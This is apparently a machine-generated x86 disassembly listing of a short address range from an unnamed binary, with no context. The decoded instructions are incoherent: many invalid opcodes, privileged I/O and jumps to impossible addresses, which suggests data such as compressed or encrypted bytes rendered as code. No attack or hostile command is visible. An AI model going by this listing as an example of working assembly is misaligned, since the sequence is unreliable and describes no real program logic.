  4164f4:	mov    ds:0x875ad260,eax
  4164f9:	sbb    esi,ecx
  4164fb:	ins    BYTE PTR es:[edi],dx
  4164fc:	dec    ecx
  4164fd:	push   ebx
  4164fe:	push   esi
  4164ff:	shr    BYTE PTR [esp+esi*1+0x14],0x32
  416504:	sbb    eax,0x36f3c3f3
  416509:	mov    ebp,0xb39b20c1
  41650e:	xor    ebx,ecx
  416510:	mov    cl,0xb5
  416512:	mov    edi,0x6a0576f2
  416517:	loope  0x416505
  416519:	add    edx,ecx
  41651b:	sub    cl,BYTE PTR [eax]
  41651d:	nop
  41651e:	mov    esi,0xdaa453c0
  416523:	jmp    0x9a052353
  416528:	or     bl,bl
  41652a:	js     0x41650d
  41652c:	outs   dx,DWORD PTR ds:[esi]
  41652d:	sub    BYTE PTR [ecx-0x7ef5ced8],ah
  416533:	sbb    eax,0xa10ee83
  416538:	and    eax,0x7a014617
  41653d:	pop    eax
  41653e:	call   0xaaec524d
  416543:	sub    bh,BYTE PTR es:[edx+0x2a29597e]
  41654a:	out    0x93,al
  41654c:	xchg   esi,eax
  41654d:	push   ss
  41654e:	push   es
  41654f:	push   es
  416550:	jae    0x41659f
  416552:	and    al,0x52
  416554:	pop    edi
  416555:	cmp    DWORD PTR [eax],eax
  416557:	int    0x6
  416559:	inc    esp
  41655a:	rcl    BYTE PTR [edi+0x42afe7cb],1
  416560:	pushf  
  416561:	test   DWORD PTR [ecx],ebx
  416563:	nop
  416564:	add    DWORD PTR [edi],ebp
  416566:	out    0x3a,eax
  416568:	push   ss
  416569:	imul   BYTE PTR [edi-0x1712f52a]
  41656f:	sbb    al,0x56
  416571:	add    ah,al
  416573:	mov    dl,0x8b
  416575:	sbb    al,0x20
  416577:	mov    edi,0xe7c417f
  41657c:	cli    
  41657d:	jg     0x41656e
  41657f:	pop    esp
  416580:	test   bl,bh
  416582:	sub    BYTE PTR [eax],ch
  416584:	outs   dx,DWORD PTR ds:[esi]
  416585:	mul    ebx
  416587:	jns    0x4165f6
  416589:	rcl    BYTE PTR [esi],cl
  41658b:	mov    bh,0x30
  41658d:	mov    esi,0x529b24
	...
  4165f2:	add    BYTE PTR [eax],al
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi+0x374fbcac]
  416601:	(bad)  ss:[eax]
  416604:	pop    esi
  416605:	in     al,dx
  416606:	add    BYTE PTR [eax],al
  416608:	add    eax,0x8000001
  41660d:	push   esp
  41660e:	into   
  41660f:	stc    
  416610:	push   cs
  416611:	fsub   st(3),st
  416613:	(bad)  
  416614:	sahf   
  416615:	shr    BYTE PTR [edi],1
  416617:	cs aaa 
  416619:	push   es
  41661a:	sub    eax,DWORD PTR [eax+0xb94f6b0]
  416620:	and    al,bl
  416622:	xlat   BYTE PTR ds:[ebx]
  416623:	mov    DWORD PTR [eax+edi*4+0x4d],edi
  416627:	or     DWORD PTR [edi],0x3257f59b
  41662d:	or     al,0x52
  41662f:	dec    ecx
  416630:	xchg   ecx,eax
  416631:	inc    ebx
  416632:	sbb    DWORD PTR [edx],0xafc9935a
  416638:	pop    ecx
  416639:	loopne 0x4165d4
  41663b:	clc    
  41663c:	(bad)  
  41663e:	pop    es
  41663f:	and    esp,ebp
  416641:	sbb    DWORD PTR [ecx-0xc],edi
  416644:	sub    cl,BYTE PTR [eax+0x3682fb6d]
  41664a:	leave  
  41664b:	js     0x4166c3
  41664d:	(bad)  [esi]
  41664f:	icebp  
  416650:	out    dx,al
  416651:	inc    edi
  416652:	mov    eax,ds:0x6082d1db
  416657:	cmp    al,0xb6
  416659:	fcom   DWORD PTR [esi-0x6b]
  41665c:	xor    ebx,DWORD PTR cs:[edx+0x79]
  416660:	jb     0x416651
  416662:	and    al,0x54
  416664:	pop    edi
  416665:	in     al,dx
  416666:	sahf   
  416667:	clc    
  416668:	enter  0xe903,0x72
  41666c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41666d:	retf   
  41666e:	push   0xdfd4c9b5
  416673:	sub    edi,edx
  416675:	(bad)  [ebp+0x7a]
  416678:	pop    esi
  416679:	retf   0x1cc2
  41667c:	mov    bl,0x9c
  41667e:	mov    dl,0x59
  416680:	jnp    0x416648
  416682:	dec    edi
  416683:	mov    esi,DWORD PTR [esi-0x36d09b4b]
  416689:	or     eax,0xb727c64
  41668e:	(bad)  
  41668f:	out    dx,al
  416690:	jbe    0x416620
  416692:	int3   
  416693:	sbb    al,BYTE PTR [eax]
  416695:	push   ds
  416696:	out    dx,al
  416697:	shl    BYTE PTR [ebp+0x1c15dfff],cl
  41669d:	into   
  41669e:	out    0x30,al
  4166a0:	mov    ebp,0xebf4b3e7
  4166a5:	push   es
  4166a6:	sbb    DWORD PTR [ecx],edx
  4166a8:	test   DWORD PTR [eax+eiz*4+0x16],ebx
  4166ac:	sub    DWORD PTR [edi+0x1e],0xffffffeb
  4166b0:	mov    ds:0xcb4ae28f,al
  4166b5:	jns    0x4166b3
  4166b7:	call   0x6a84:0x45b4cc1b
  4166be:	mov    dl,0x1f
  4166c0:	mov    ebp,0xdeb5d33
  4166c5:	imul   esi,eax,0x4b
  4166c8:	sbb    esi,eax
  4166ca:	retf   
  4166cb:	push   ss
  4166cc:	push   edi
  4166cd:	into   
  4166ce:	ss pop ebx
  4166d0:	popa   
  4166d1:	push   esi
  4166d2:	and    ah,BYTE PTR [ebp-0x547503a2]
  4166d8:	fisubr WORD PTR [esp+ecx*2]
  4166db:	inc    ebx
  4166dc:	in     al,0x72
  4166de:	cmp    ecx,DWORD PTR [edx+eax*1+0x71]
  4166e2:	mov    esi,0xe8e4fd82
  4166e7:	mov    eax,0x9ba6fe88
  4166ec:	rol    DWORD PTR [ecx],1
  4166ee:	ins    BYTE PTR es:[edi],dx
  4166ef:	daa    
  4166f0:	add    esi,edx
  4166f2:	add    DWORD PTR [edx-0x6e],edx
  4166f5:	mov    ebp,0xe3c0a39f
  4166fa:	imul   esp,DWORD PTR [edx],0x2c
  4166fd:	rcr    ch,cl
  4166ff:	aad    0xe
  416701:	push   esp
  416702:	adc    DWORD PTR [ecx+edx*8-0x6e64f964],ebp
  416709:	pop    ebp
  41670a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41670b:	jecxz  0x4166fd
  41670d:	xor    edx,DWORD PTR ds:0xd76
	...
  416773:	add    ah,al
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	adc    BYTE PTR [ecx-0x5e],dh
  416783:	fldenv [ebx-0x13]
  416786:	add    BYTE PTR [eax],al
  416788:	add    eax,0x37000001
  41678d:	not    BYTE PTR [ebx+0x1762c42d]
  416793:	push   ss
  416794:	aad    0x7f
  416796:	pop    ecx
  416797:	clc    
  416798:	imul   esp,DWORD PTR [ebx],0xfa688e7
  41679e:	shl    DWORD PTR [ebp-0x68c9fbae],cl
  4167a4:	jp     0x41674f
  4167a6:	sub    ch,BYTE PTR ds:0x4d35e4e5
  4167ac:	adc    ebx,DWORD PTR [edx+edx*1-0xe]
  4167b0:	xchg   ecx,eax
  4167b1:	fstp   DWORD PTR [ecx]
  4167b3:	xchg   DWORD PTR ds:0xb0b3ec73,esp
  4167b9:	mov    WORD PTR [edx],?
  4167bb:	and    DWORD PTR [ebx-0x1e26ea95],edx
  4167c1:	sbb    dl,BYTE PTR [ebp+0x6eb61660]
  4167c7:	and    al,0x91
  4167c9:	xchg   esp,eax
  4167ca:	mov    edx,ss
  4167cc:	pop    ds
  4167cd:	dec    ebp
  4167ce:	shr    BYTE PTR [edx],0xb3
  4167d1:	fwait
  4167d2:	dec    edi
  4167d3:	jp     0x41679b
  4167d5:	sbb    al,0x48
  4167d7:	mov    DWORD PTR [ebx+0x6d],edx
  4167da:	mov    ebp,0x9403262b
  4167df:	dec    ecx
  4167e0:	je     0x416853
  4167e2:	imul   esi,DWORD PTR [eax],0x41
  4167e5:	sahf   
  4167e6:	in     al,0x7a
  4167e8:	retf   0x5951
  4167eb:	mov    bl,0xe0
  4167ed:	sbb    al,0x94
  4167ef:	mov    ebx,0x9a27bc7f
  4167f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167f5:	push   ss
  4167f6:	shr    DWORD PTR [edi-0x73],cl
  4167f9:	xchg   esi,eax
  4167fa:	jl     0x416792
  4167fc:	adc    ebp,DWORD PTR [ebp-0x3b]
  4167ff:	dec    ebx
  416800:	adc    eax,DWORD PTR [edx+ebp*8-0x16]
  416804:	lock push ds
  416806:	push   ebp
  416807:	mov    bh,0x88
  416809:	push   es
  41680a:	mov    ds:0x176834a8,eax
  41680f:	cmp    ch,0x1c
  416812:	ror    BYTE PTR [edi-0x3551571f],0x79
  416819:	clc    
  41681a:	mov    dl,0xaa
  41681c:	cmp    DWORD PTR [edi-0x77],0x54
  416820:	dec    edi
  416821:	gs xchg ebx,eax
  416823:	jmp    0x4167bd
  416825:	cmp    DWORD PTR [ebp+ebp*2+0x75ca8fe1],esi
  41682c:	inc    edi
  41682d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41682e:	push   cs
  41682f:	rcl    BYTE PTR [esi-0x75],0xe5
  416833:	xchg   edx,eax
  416834:	out    0x92,al
  416836:	psubq  mm0,QWORD PTR [edi+0x23]
  41683a:	mov    al,ds:0xe57b43f
  41683f:	xor    eax,DWORD PTR [edx-0x176ad805]
  416845:	inc    ebx
  416846:	popa   
  416847:	(bad)  
  416848:	leave  
  416849:	or     ah,BYTE PTR [edi+0x57122089]
  41684f:	lahf   
  416850:	stos   DWORD PTR es:[edi],eax
  416851:	sub    BYTE PTR [edx+0x43],al
  416854:	and    BYTE PTR [esi+0x25],cl
  416857:	sub    al,BYTE PTR [ebx]
  416859:	retf   0x9f68
  41685c:	inc    ecx
  41685d:	mov    al,0x40
  41685f:	and    BYTE PTR [ebp-0x5c],dh
  416862:	leave  
  416863:	ins    DWORD PTR es:[edi],dx
  416864:	cmp    DWORD PTR [ecx-0x48c1aa0c],0x1a
  41686b:	mov    eax,DWORD PTR [ebx]
  41686d:	sbb    BYTE PTR [ecx-0x6d],dl
  416870:	fst    DWORD PTR [edi]
  416872:	(bad)  [eax-0x1d]
  416875:	jns    0x416842
  416877:	mov    eax,ds:0x108348e2
  41687c:	mov    ds:0x3424c45f,al
  416881:	xor    BYTE PTR ss:[ecx-0x3842523d],cl
  416888:	cmp    dl,ch
  41688a:	in     eax,dx
  41688b:	xchg   edx,eax
  41688c:	(bad)  
  41688d:	cs xchg edx,eax
  41688f:	xchg   edx,eax
  416890:	cmp    BYTE PTR [eax],al
	...
  4168f2:	add    BYTE PTR [eax],al
  4168f4:	shr    DWORD PTR [edi-0x4810cfa],1
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0xca20706f
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    BYTE PTR [edx+ebp*2],al
  41690e:	es clc 
  416910:	in     al,dx
  416911:	aam    0xac
  416913:	scas   al,BYTE PTR es:[edi]
  416914:	add    DWORD PTR [edi],esp
  416916:	mov    edi,esp
  416918:	sub    dl,BYTE PTR [edi]
  41691a:	or     al,0xf6
  41691c:	adc    ebx,DWORD PTR [ebx*4-0x2f9cd441]
  416923:	aaa    
  416924:	adc    DWORD PTR [eax+0x3],ecx
  416927:	(bad)  
  416928:	and    ebx,DWORD PTR [edx+0x6a29f0b6]
  41692e:	fucomp st(6)
  416930:	in     al,dx
  416931:	lods   al,BYTE PTR ds:[esi]
  416932:	xchg   esi,eax
  416933:	les    esi,FWORD PTR [edi-0x3b]
  416936:	dec    esp
  416937:	ss imul ecx,DWORD PTR gs:[ebp+0x1e],0xffffff81
  41693d:	xchg   edi,eax
  41693e:	cmp    BYTE PTR [edx-0x10],ch
  416941:	gs ror DWORD PTR cs:[ecx+0x1d],0x6a
  416947:	(bad)  
  416949:	(bad)  
  41694a:	cli    
  41694b:	jb     0x41695b
  41694d:	xchg   esi,eax
  41694e:	imul   edx,DWORD PTR ds:0x3a11f959,0xad4bcf04
  416958:	out    dx,al
  416959:	out    0xc3,eax
  41695b:	push   esi
  41695c:	xor    eax,0xecb515c3
  416961:	icebp  
  416962:	push   ebp
  416963:	dec    esi
  416964:	in     al,dx
  416965:	jnp    0x4169dd
  416967:	adc    al,0xa7
  416969:	pop    ss
  41696a:	sub    BYTE PTR [eax-0x43],dh
  41696d:	pop    edx
  41696e:	bound  ecx,QWORD PTR [eax]
  416970:	je     0x41696c
  416972:	jge    0x41694b
  416974:	nop
  416975:	jno    0x416950
  416977:	cld    
  416978:	push   cs
  416979:	lods   eax,DWORD PTR ds:[esi]
  41697a:	cdq    
  41697b:	sbb    bl,BYTE PTR [esi-0x2114e903]
  416981:	inc    esp
  416982:	mov    ah,0x85
  416984:	(bad)  
  416985:	scas   eax,DWORD PTR es:[edi]
  416986:	cmp    DWORD PTR [ebx],edi
  416988:	xchg   ecx,eax
  416989:	sub    ebp,0xffffffb8
  41698c:	mov    ebp,0x1f401750
  416991:	and    eax,0x16a8d8d8
  416996:	xchg   ebp,eax
  416997:	jge    0x416925
  416999:	scas   al,BYTE PTR es:[edi]
  41699a:	ins    DWORD PTR es:[edi],dx
  41699b:	jo     0x4169d0
  41699d:	dec    DWORD PTR gs:[ebx-0x53b1c176]
  4169a4:	inc    esi
  4169a5:	cmp    dl,BYTE PTR [esi]
  4169a7:	outs   dx,BYTE PTR ds:[esi]
  4169a8:	sub    edx,esi
  4169aa:	pop    es
  4169ab:	mov    ah,0x10
  4169ad:	js     0x416a04
  4169af:	sbb    bl,BYTE PTR [ebx+0x79]
  4169b2:	mov    ecx,0x2b3d3273
  4169b7:	rcl    BYTE PTR [esp+edi*4+0x65d24d4c],cl
  4169be:	(bad)  [esi-0x2d29e876]
  4169c4:	adc    edx,DWORD PTR [esi+0x61c356]
  4169ca:	arpl   cx,dx
  4169cc:	mov    cl,0xe2
  4169ce:	cmp    eax,0x2b0e092c
  4169d3:	xchg   edx,eax
  4169d4:	js     0x4169e3
  4169d6:	add    DWORD PTR [eax+0x3d95049],ebp
  4169dc:	push   cs
  4169dd:	jnp    0x41698e
  4169df:	sar    BYTE PTR [edx],1
  4169e1:	jnp    0x416a08
  4169e3:	mov    edx,0x9a9d5b70
  4169e8:	les    eax,FWORD PTR [edi+edi*1+0x1da7c5f7]
  4169ef:	icebp  
  4169f0:	into   
  4169f1:	xor    BYTE PTR cs:[ecx],ah
  4169f4:	fs call 0x5b73:0xc2ce1f39
  4169fc:	inc    esp
  4169fd:	or     eax,0x2d067097
  416a02:	xor    ecx,eax
  416a04:	xor    BYTE PTR [ebp-0x3df2de6d],ch
  416a0a:	sub    ch,BYTE PTR [edi]
  416a0c:	clc    
  416a0d:	pop    edx
  416a0e:	and    BYTE PTR [ecx+0x22],dh
	...
  416a74:	retf   
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x50560ba3
  416a82:	and    DWORD PTR [edx],0xef6d
  416a88:	add    eax,0x46000001
  416a8d:	jne    0x416a61
  416a8f:	jecxz  0x416aa1
  416a91:	mov    al,ds:0xbfcaabd6
  416a96:	pop    ds
  416a97:	pop    edi
  416a98:	fs pop edx
  416a9a:	imul   ecx,DWORD PTR [ecx-0xe064dcf],0x1212aee9
  416aa4:	popa   
  416aa5:	pop    ss
  416aa6:	jnp    0x416a36
  416aa8:	mov    ds:0x24784c11,al
  416aad:	adc    DWORD PTR [eax+eax*2],edi
  416ab0:	arpl   WORD PTR [ebp-0x2bd0a6e5],di
  416ab6:	pop    ecx
  416ab7:	cs mov bl,0x3a
  416aba:	in     eax,dx
  416abb:	in     al,dx
  416abc:	pop    ebp
  416abd:	lods   eax,DWORD PTR ds:[esi]
  416abe:	mov    ch,0x58
  416ac0:	in     al,0xf8
  416ac2:	lea    edi,[ecx]
  416ac4:	ror    cl,1
  416ac6:	jge    0x416ad2
  416ac8:	(bad)  
  416ac9:	xchg   esp,eax
  416aca:	add    BYTE PTR [ebx+0x4b],ah
  416acd:	ins    DWORD PTR es:[edi],dx
  416ace:	xchg   ecx,eax
  416acf:	(bad)  
  416ad0:	xchg   ebx,eax
  416ad1:	cmp    edx,0xffffffa0
  416ad4:	pop    edx
  416ad5:	inc    ebp
  416ad6:	sub    DWORD PTR [ebx+0x3500f66e],ebx
  416adc:	mov    ch,0x55
  416ade:	popa   
  416adf:	xchg   DWORD PTR [eax],eax
  416ae1:	add    BYTE PTR [edx-0x7d24e5ea],dh
  416ae7:	fs into 
  416ae9:	jl     0x416add
  416aeb:	retf   
  416aec:	or     eax,0x4c10767
  416af1:	push   0x2b
  416af3:	sub    eax,0xb7d509f2
  416af8:	jp     0x416ae8
  416afa:	dec    edi
  416afb:	sub    ebx,0x1e
  416afe:	jae    0x416b72
  416b00:	fbld   TBYTE PTR [ebp+0x36]
  416b03:	adc    dl,BYTE PTR [esi]
  416b05:	aas    
  416b06:	add    DWORD PTR [edx+0x6f],ecx
  416b09:	xor    al,0x8a
  416b0b:	inc    esi
  416b0c:	or     DWORD PTR [ecx+edx*1+0x38],esi
  416b10:	mov    cs,WORD PTR [edx]
  416b12:	fnsave [esi-0x73]
  416b15:	stos   BYTE PTR es:[edi],al
  416b16:	js     0x416b53
  416b18:	mov    ch,0xa5
  416b1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b1b:	aas    
  416b1c:	loopne 0x416aad
  416b1e:	scas   eax,DWORD PTR es:[edi]
  416b1f:	mov    WORD PTR [eax-0x73],cs
  416b22:	sbb    al,0x84
  416b24:	test   al,0xb0
  416b26:	xchg   ebx,eax
  416b27:	push   esp
  416b28:	and    esi,DWORD PTR [ecx+0x5]
  416b2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b2c:	addr16 loope 0x416b8e
  416b2f:	pushf  
  416b30:	fdivp  st(2),st
  416b32:	out    dx,al
  416b33:	sub    eax,0xfe8649c1
  416b38:	stos   DWORD PTR es:[edi],eax
  416b39:	cdq    
  416b3a:	mov    ch,0xdd
  416b3c:	(bad)  
  416b3d:	adc    BYTE PTR [ebp+0x1b5cbcd7],dl
  416b43:	cwde   
  416b44:	inc    ecx
  416b45:	mov    ecx,0xddb07ffb
  416b4a:	imul   ecx,DWORD PTR [eax+0x31fce67e],0x4
  416b51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b52:	xor    dh,BYTE PTR [ecx-0x2db87c1e]
  416b58:	xchg   esp,eax
  416b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b5a:	cmc    
  416b5b:	jge    0x416bd7
  416b5d:	add    DWORD PTR [edx],0x1d1f0580
  416b63:	into   
  416b64:	inc    esi
  416b65:	lea    esp,[ebx-0x6d]
  416b68:	add    al,0xb4
  416b6a:	sti    
  416b6b:	xchg   BYTE PTR [ecx],dl
  416b6d:	(bad)  
  416b6e:	fidiv  WORD PTR [ebp+ebp*8+0x27]
  416b72:	mov    ah,0x55
  416b74:	leave  
  416b75:	mov    WORD PTR [edx],fs
  416b77:	adc    eax,0x26f9d4ac
  416b7c:	(bad)  
  416b7d:	enter  0xcba7,0xd4
  416b81:	in     al,dx
  416b82:	mov    edi,0x189302a4
  416b87:	push   cs
  416b88:	cli    
  416b89:	test   DWORD PTR [ecx+0x2ef51f58],0xdb6f
	...
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x535b70a9
  416c01:	push   0xf0726986
  416c06:	add    BYTE PTR [eax],al
  416c08:	add    eax,0xff000001
  416c0d:	into   
  416c0e:	cmp    ebx,DWORD PTR [ebp-0x6e367fe1]
  416c14:	xchg   ebp,eax
  416c15:	fnstenv [edi+eax*1+0x5f17c0ac]
  416c1c:	ins    DWORD PTR es:[edi],dx
  416c1d:	retf   
  416c1e:	and    BYTE PTR [eax],dh
  416c20:	fisubr WORD PTR [edi+0x722708d6]
  416c26:	out    0x31,al
  416c28:	mov    ecx,0x1050c623
  416c2d:	jg     0x416bb3
  416c2f:	inc    eax
  416c30:	mov    ds:0xef889962,eax
  416c35:	test   BYTE PTR [ebp+0x27],0x90
  416c39:	jl     0x416c47
  416c3b:	cmp    eax,0x410441eb
  416c40:	out    0xaf,al
  416c42:	mov    WORD PTR [ebx+0x44872018],cs
  416c48:	dec    ebx
  416c49:	rcr    BYTE PTR [ebx+0x4a],0xa4
  416c4d:	mov    bh,0x49
  416c4f:	mov    bl,0x9f
  416c51:	or     eax,0x41bf8359
  416c56:	sub    eax,DWORD PTR [eax+0x734711d5]
  416c5c:	jno    0x416c12
  416c5e:	ret    0xb8fe
  416c61:	mov    ch,BYTE PTR ds:0x2af2d310
  416c67:	add    BYTE PTR ds:0x78f421d3,0xc1
  416c6e:	cmp    BYTE PTR [ebp-0x7c],dh
  416c71:	mov    ebx,0xad1ac577
  416c76:	and    BYTE PTR [ebx],ah
  416c78:	xor    al,0x3a
  416c7a:	out    0x90,eax
  416c7c:	mov    cl,0x7c
  416c7e:	mov    dl,0x36
  416c80:	xchg   ebp,eax
  416c81:	hlt    
  416c82:	fild   WORD PTR [edx-0x15]
  416c85:	ret    
  416c86:	mov    dh,0x3d
  416c88:	add    dh,BYTE PTR [ebx]
  416c8a:	ror    esp,0x69
  416c8d:	into   
  416c8e:	xor    dl,ch
  416c90:	pop    edx
  416c91:	sbb    eax,0xa30f6e43
  416c96:	hlt    
  416c97:	repnz sub esp,ebx
  416c9a:	sub    al,0xcb
  416c9c:	mov    esp,0x588faf2
  416ca1:	es stos DWORD PTR es:[edi],eax
  416ca3:	and    ecx,DWORD PTR [eax-0x7f]
  416ca6:	push   esi
  416ca7:	outs   dx,DWORD PTR ds:[esi]
  416ca8:	cmc    
  416ca9:	shl    esp,0x43
  416cac:	ss ja  0x416ce0
  416caf:	in     al,dx
  416cb0:	pop    esi
  416cb1:	sbb    dh,BYTE PTR [ebx]
  416cb3:	or     al,0xb1
  416cb5:	retf   0xcb5
  416cb8:	adc    BYTE PTR [eax+0x77],dh
  416cbb:	(bad)
  416cc0:	jno    0x416c85
  416cc2:	(bad)  
  416cc3:	push   eax
  416cc4:	jmp    0xea545263
  416cc9:	inc    edi
  416cca:	fcom   QWORD PTR [esi-0x37]
  416ccd:	nop
  416cce:	jmp    0x750d:0x3481df87
  416cd5:	xchg   esp,eax
  416cd6:	jne    0x416d52
  416cd8:	pop    edi
  416cd9:	jbe    0x416cfd
  416cdb:	push   cs
  416cdc:	mov    ?,WORD PTR [edi+edx*8-0x41]
  416ce0:	nop
  416ce1:	mov    ebp,0x922e97fa
  416ce6:	mov    edi,0x4708425e
  416ceb:	mov    ebp,0xdae0efb8
  416cf0:	inc    ebp
  416cf1:	pop    ds
  416cf2:	das    
  416cf3:	xchg   edx,eax
  416cf4:	fadd   st(2),st
  416cf6:	cmp    BYTE PTR [eax],cl
  416cf8:	es add al,0x94
  416cfb:	and    esi,esi
  416cfd:	sbb    eax,0xd0c85627
  416d02:	cmc    
  416d03:	push   0x2d
  416d05:	sahf   
  416d06:	pop    ebx
  416d07:	cld    
  416d08:	retf   
  416d09:	mov    bh,0x7a
  416d0b:	mov    al,0x1e
  416d0d:	(bad)  
  416d0e:	shr    BYTE PTR [eax+0x85],1
	...
  416d74:	and    DWORD PTR [ebx-0x40445077],edx
  416d7a:	daa    
  416d7b:	lahf   
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	jo     0x416d73
  416d82:	or     cl,BYTE PTR [ecx+0x77]
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    eax,0x1d000001
  416d8d:	jl     0x416dfa
  416d8f:	sar    DWORD PTR [ebx-0x364244e5],0x3
  416d96:	inc    edi
  416d97:	mov    cl,0x8f
  416d99:	jmp    0xc695942a
  416d9e:	cwde   
  416d9f:	fiadd  WORD PTR [edx]
  416da1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416da2:	push   ebx
  416da3:	je     0x416da6
  416da5:	jl     0x416d7c
  416da7:	arpl   bp,di
  416da9:	lds    ebp,FWORD PTR [ebx-0x2e]
  416dac:	push   edi
  416dad:	xor    al,0x38
  416daf:	arpl   WORD PTR [edx],bp
  416db1:	jecxz  0x416d55
  416db3:	pop    edi
  416db4:	and    al,0x72
  416db6:	lock or BYTE PTR [ebx+0x3ba38ed],ch
  416dbd:	and    esp,ebx
  416dbf:	add    al,0xb8
  416dc1:	sub    esi,DWORD PTR [edi+ebp*2]
  416dc4:	cmp    dh,0xcd
  416dc7:	sub    dh,dh
  416dc9:	in     eax,0x62
  416dcb:	mov    DWORD PTR [ebx],ebp
  416dcd:	cli    
  416dce:	jp     0x416d55
  416dd0:	sub    DWORD PTR [ebp+0x76977f45],0xffffffd8
  416dd7:	fist   WORD PTR es:[edx-0x5677ef42]
  416dde:	popf   
  416ddf:	mov    fs,WORD PTR [ebp-0x8]
  416de2:	out    dx,eax
  416de3:	retf   
  416de4:	daa    
  416de5:	popf   
  416de6:	cwde   
  416de7:	je     0x416db6
  416de9:	xor    edx,DWORD PTR [ebp+eax*8+0x7]
  416ded:	xor    al,0x8d
  416def:	push   ss
  416df0:	inc    ebp
  416df1:	sbb    al,0x93
  416df4:	les    ebp,FWORD PTR ds:0x7bd58503
  416dfa:	cmp    bl,BYTE PTR [edi]
  416dfc:	ja     0x416dce
  416dfe:	into   
  416dff:	mov    ds:0x4116a261,al
  416e04:	inc    ebp
  416e05:	test   BYTE PTR [eax+esi*4+0x71],ah
  416e09:	xor    esi,DWORD PTR [eax+0x73fa134f]
  416e0f:	pop    esi
  416e10:	(bad)  
  416e11:	mov    ebp,0x849a0caa
  416e16:	inc    ebx
  416e17:	mov    BYTE PTR ds:0xc45ae3f5,bh
  416e1d:	cld    
  416e1e:	jae    0x416dbd
  416e20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e21:	or     BYTE PTR [ebx],ah
  416e23:	cmc    
  416e24:	cmp    DWORD PTR [edi-0x17],0xdb2e367b
  416e2b:	pop    edx
  416e2c:	pop    es
  416e2d:	aaa    
  416e2e:	pop    esi
  416e2f:	xchg   edi,eax
  416e30:	jmp    0xa457002b
  416e35:	adc    al,BYTE PTR [ecx-0x12]
  416e38:	aam    0xc5
  416e3a:	adc    bl,BYTE PTR [edi]
  416e3c:	inc    ebp
  416e3d:	dec    edx
  416e3e:	inc    esp
  416e3f:	pop    esi
  416e40:	outs   dx,BYTE PTR ds:[esi]
  416e41:	scas   eax,DWORD PTR es:[edi]
  416e42:	pop    ss
  416e43:	dec    edi
  416e44:	(bad)  
  416e45:	hlt    
  416e46:	ins    DWORD PTR es:[edi],dx
  416e47:	inc    ebp
  416e48:	and    DWORD PTR [ecx-0x5d],esi
  416e4b:	push   ds
  416e4c:	pusha  
  416e4d:	and    ebx,DWORD PTR [esi+0x6b0457b8]
  416e53:	out    0x58,eax
  416e55:	les    edx,FWORD PTR [edi+0x22]
  416e58:	and    cl,dl
  416e5a:	mov    ebp,0x62cf65d6
  416e5f:	fistp  DWORD PTR [edx-0x2d655339]
  416e65:	out    0xa9,al
  416e67:	mov    edx,0xd37f46d3
  416e6c:	jge    0x416df3
  416e6e:	gs lahf 
  416e70:	jecxz  0x416eb1
  416e72:	pop    edi
  416e73:	xor    DWORD PTR [ebx],0x5812dada
  416e79:	or     BYTE PTR [ebp+0x4dd89d46],bh
  416e7f:	inc    ebp
  416e80:	push   esi
  416e81:	shl    DWORD PTR [edi+0x87a5503],0x44
  416e88:	adc    eax,0xd4cceaa4
  416e8d:	lea    esp,[esi+0x4f]
  416e90:	fwait
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0xe1d38eea
  416f02:	inc    esp
  416f03:	idiv   BYTE PTR [edx+esi*8+0x0]
  416f07:	add    BYTE PTR ds:0xb1000001,al
  416f0d:	and    BYTE PTR [ebx-0x3a],ch
  416f10:	out    0x5,al
  416f12:	mov    bh,0x48
  416f14:	fistp  QWORD PTR [ecx+ecx*2+0x53]
  416f18:	(bad)  
  416f19:	jg     0x416f21
  416f1b:	les    edx,FWORD PTR [eax]
  416f1d:	shl    BYTE PTR [eax-0x691b01bd],1
  416f23:	cmp    BYTE PTR [esi+0x76],bl
  416f26:	mov    ds:0xdfbc0c04,eax
  416f2b:	and    DWORD PTR [eax+0x4],esi
  416f2e:	shl    ch,cl
  416f30:	add    edx,DWORD PTR [edx+0x77fc941]
  416f36:	ret    
  416f37:	mov    eax,0x753a5c16
  416f3c:	lods   eax,DWORD PTR ds:[esi]
  416f3d:	xlat   BYTE PTR ds:[ebx]
  416f3e:	cmp    BYTE PTR [edi+0x14f5e3d7],dh
  416f44:	(bad)  
  416f46:	(bad)  
  416f47:	(bad)  
  416f48:	fld    QWORD PTR [edx]
  416f4a:	fdiv   DWORD PTR [ebp+0x6f]
  416f4d:	adc    eax,0x84c7134d
  416f52:	nop
  416f53:	mov    bl,0x2e
  416f55:	and    bl,BYTE PTR [ecx+0xf1e8f17]
  416f5b:	out    0xc8,eax
  416f5d:	in     eax,dx
  416f5e:	xor    BYTE PTR ds:0x99ddcda0,dh
  416f64:	aam    0xa4
  416f66:	dec    ebp
  416f67:	fdiv   QWORD PTR [esi]
  416f69:	jmp    0x7327ffd6
